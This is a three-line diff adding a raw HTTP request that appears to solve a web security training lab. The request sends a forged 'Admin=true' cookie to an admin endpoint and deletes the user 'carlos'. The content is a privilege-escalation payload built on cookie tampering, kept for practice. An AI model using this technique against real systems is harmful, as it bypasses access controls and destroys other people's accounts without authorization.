@@ -1,0 +1,3 @@
+GET /admin/delete?username=carlos HTTP/1.1
+Host: ac381f171f860d0bc0673d69006d00e2.web-security-academy.net
+Cookie: session=p7g84AfbckNgAHYC5t0Pqfd2b8e9rEoq; Admin=true
